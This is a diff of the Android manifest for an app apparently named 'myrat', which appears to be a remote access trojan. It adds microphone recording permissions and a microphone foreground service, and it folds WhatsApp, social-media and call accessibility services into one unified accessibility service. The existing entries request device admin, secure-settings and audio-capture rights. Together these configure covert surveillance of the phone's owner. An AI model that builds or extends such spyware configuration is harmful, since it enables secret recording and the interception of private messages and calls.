@@ -37,6 +37,7 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" android:minSdkVersion="34" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" android:minSdkVersion="34" />
 
     <!-- System permissions -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
@@ -51,12 +52,12 @@
 
     <!-- Enhanced permissions for advanced features -->
     <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.USE_FINGERPRINT" />
     <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
     <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS" />
     <uses-permission android:name="android.permission.CHANGE_CONFIGURATION" />
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT" />
     <uses-permission android:name="android.permission.CAPTURE_SECURE_VIDEO_OUTPUT" />
     <uses-permission android:name="android.permission.MEDIA_CONTENT_CONTROL" />
@@ -220,10 +221,15 @@
                 <action android:name="com.myrat.app.service.LockService" />
             </intent-filter>
         </service>
-
-        <!-- WhatsApp Accessibility Service -->
         <service
-            android:name=".service.WhatsAppService"
+            android:name=".service.MicrophoneService"
+            android:exported="false"
+            android:enabled="true"
+            android:foregroundServiceType="microphone" />
+
+        <!-- Single Unified Accessibility Service -->
+        <service
+            android:name=".service.UnifiedAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="true"
             android:enabled="true">
@@ -232,35 +238,7 @@
             </intent-filter>
             <meta-data
                 android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_service_config"/>
-        </service>
-
-        <!-- Social Media Accessibility Service -->
-        <service
-            android:name=".service.SocialMediaService"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="true"
-            android:enabled="true">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService"/>
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/social_media_accessibility_service_config"/>
-        </service>
-
-        <!-- Call Accessibility Service -->
-        <service
-            android:name=".service.CallAccessibilityService"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="true"
-            android:enabled="true">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService"/>
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/call_accessibility_service_config"/>
+                android:resource="@xml/unified_accessibility_service_config"/>
         </service>
 
         <receiver
